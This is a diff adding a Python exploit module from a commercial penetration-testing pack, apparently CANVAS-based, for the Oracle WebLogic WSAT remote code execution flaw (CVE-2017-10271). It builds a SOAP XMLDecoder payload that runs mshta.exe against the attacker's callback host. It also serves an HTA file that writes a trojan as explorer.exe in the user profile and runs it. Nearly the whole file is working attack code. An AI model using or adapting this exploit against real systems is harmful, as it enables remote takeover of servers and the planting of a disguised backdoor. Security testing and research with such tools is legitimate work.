@@ -1,0 +1,355 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import random
+import time
+import thread
+import base64
+import urllib, urllib2
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.canvasos import *
+
+import struct
+import canvasengine
+import re
+
+# GUI info
+NAME = "Oracle WebLogic WSAT Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in Oracle WebLogic web services subcomponent wls-wsat"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Oracle"
+DOCUMENTATION["Date public"] = "2017.10.17"
+DOCUMENTATION["VersionsAffected"] = "<= 10.3.6.0.0"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html"
+DOCUMENTATION["CVE Name"] = "CVE-2017-10271"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit(tcpexploit):
+    def __init__(self):
+    	tcpexploit.__init__(self)
+    	self.TROJANMODE = 0
+    	self.setInfo(DESCRIPTION)
+    	self.name = NAME       
+    	self.protocol = "http"
+    	self.port = 7001
+    	self.sslport = 7001
+    	self.https = 0                
+    	self.version = 0
+    	self.cmd = ""    	        
+    	self.trojanname = "index.hta"                
+    	return
+
+ 
+    def file4hta(self, exename):
+    	evilprog = "explorer.exe"
+    	e = []
+    	
+    	for a in exename:
+    		for b in a:
+    			if b == "\r":
+    				d = "0d"
+    			elif b == "\n":
+    				d = "0a"
+    			elif b == "\0":
+    				d = "00"
+    			else:
+    				c = hex(ord(b))
+    				d = c.replace("0x", "")
+
+    			if len(d) == 1:
+    				d = "0"+d
+
+    			e.append(d)
+	
+    	i = 0
+    	j = 0
+    	l = len(e)
+
+    	hta = "<SCRIPT language=vbs>\n\n"
+    	
+    	while 1:
+    		hta += " prog = prog & \""
+
+    		while i != 24:
+    			hta += "%s," % e[j]
+    			
+    			if j == l-1:
+    				break
+    				
+    			i += 1
+    			j += 1
+
+    		if j == l-1:
+    			hta = hta[:-1] + "\"\n\n"
+    			break
+    			
+    		hta += "\"\n"
+    		i = 0
+
+    	hta += " tmp = Split(prog, \",\")\n"	
+    	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+    	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+    	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+    	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+    	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+    	hta += " For i = 0 To UBound(tmp)\n"
+    	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+    	hta += "   f.Write Chr(prog)\n"
+    	hta += " Next\n\n"
+    	hta += " f.Close\n"
+    	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+    	hta += " self.Close\n"
+    	hta += "</SCRIPT>\n"
+
+    	return hta
+ 
+ 
+    def maketrojan(self):   
+    	t_os = canvasos("Windows")
+    	t_os.arch = "X86"
+        
+    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
+    	self.htafile = self.file4hta(self.mosdeftrojan)
+    	file(self.trojanname, "wb").write(self.htafile)
+    	self.setInfo("%s - done"%(NAME))
+    	ret = len(self.mosdeftrojan) != 0
+
+
+    def makesploit(self, clientheader, clientbody):            	
+    	h = spkproxy.header('SERVER')
+    	b = spkproxy.body()
+        
+    	self.maketrojan()
+                
+    	if clientheader.URL.count(self.trojanname):
+    		self.log("Sending MOSDEF trojan")
+    		f = open(self.trojanname, "rb")
+    		sploitstring = f.read()
+    		f.close()
+    		os.remove(self.trojanname)
+    		self.log("Sending %d bytes"%len(sploitstring))
+    		h.addHeader("Content-type","binary/octet-stream")
+    		h.addHeader("Connection","close")
+    		b.setBody(sploitstring)
+
+    	return h, b
+
+
+    def neededListenerTypes(self):
+    	from canvasengine import WIN32MOSDEF
+    	return [WIN32MOSDEF]
+
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):
+        self.getargs()
+        s=self.gettcplistener(80, "0.0.0.0")
+
+        if not s:
+            if self.port < 1024:
+                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
+                         "you can try to bind to a higher port" % self.port)
+            else:
+                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
+            return 0
+        s.set_timeout(5)
+        self.s=s
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+        #we loop on this ,so no annoying printouts here
+        #self.log("Accepting connection")
+        if s==None:
+            s=self.s 
+        try:
+            infd,addr=s.accept()
+        except timeoutsocket.Timeout:
+            #self.log("Timed out - no accept yet")
+            return 
+        if infd==-1:
+            return
+
+        #else we have an infd
+        self.handle(infd)
+        return True #handled connection
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = spkproxy.header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = spkproxy.body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        #now we respond...
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+	self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close() #connection close - later on we'll keep it.
+        return 
+    #
+    #################################################################################################################
+        
+        
+    def startHTTPServer(self):
+    	s = self.listen()
+        
+    	if not s:
+    		self.log("Failed to listen - not running")
+    		return 0
+    		
+    	while 1:
+    		if self.state==self.HALT:
+    			self.s.close()
+    			break
+    			
+    		self.accept()
+
+    	self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+        
+    	return 1    	
+    
+
+    def run(self):    	    	               
+    	# Check arguments
+    	self.host = self.target.interface
+    	self.port = int(self.argsDict.get("port", self.port))    
+    	self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    	self.https = int(self.argsDict.get("https", self.https))     
+        
+    	self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname        
+
+    	thread.start_new_thread(self.startHTTPServer,())
+                	                	               
+    	self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+    	self.log("Attacking %s:%d"%(self.host, self.port))                                  	
+        
+        if self.https == 0:
+            self.protocol = "http"
+        else:
+            self.protocol = "https"
+            self.port = self.sslport
+
+        ua = spkproxy.UserAgent("", exploit=self)
+    	ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
+        
+        params  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">' 
+        params += '<soapenv:Header>'
+        params += '<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">' 
+        params += '<java version="1.8.0_151" class="java.beans.XMLDecoder">' 
+        params += '<void class="java.lang.ProcessBuilder">' 
+        params += '<array class="java.lang.String" length="3">'
+        params += '<void index = "0">'
+        params += '<string>cmd</string>'
+        params += '</void>'
+        params += '<void index = "1">' 
+        params += '<string>/c</string>' 
+        params += '</void>'
+        params += '<void index = "2">'
+        params += '<string>%s</string>'%self.cmd
+        params += '</void>'
+        params += '</array>'
+        params += '<void method="start"/>'
+        params += '</void>'
+        params += '</java>'
+        params += '</work:WorkContext>' 
+        params += '</soapenv:Header>' 
+        params += '<soapenv:Body/>'
+        params += '</soapenv:Envelope>'
+
+        url = "/wls-wsat/CoordinatorPortType"    
+        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+        ua.addHeader("Content-Type", "text/xml;charset=UTF-8")        
+        data = ua.POST(mainurl, params)    
+
+    	return 1
+ 
+        		
+    def usage(self):        
+    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]
+
+    	i = 0
+
+    	print 'Available versions:'
+
+    	for listline in targets.values():
+    		print '\t%d: %s'%(i, listline)
+    		i = i + 1
+
+    	sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
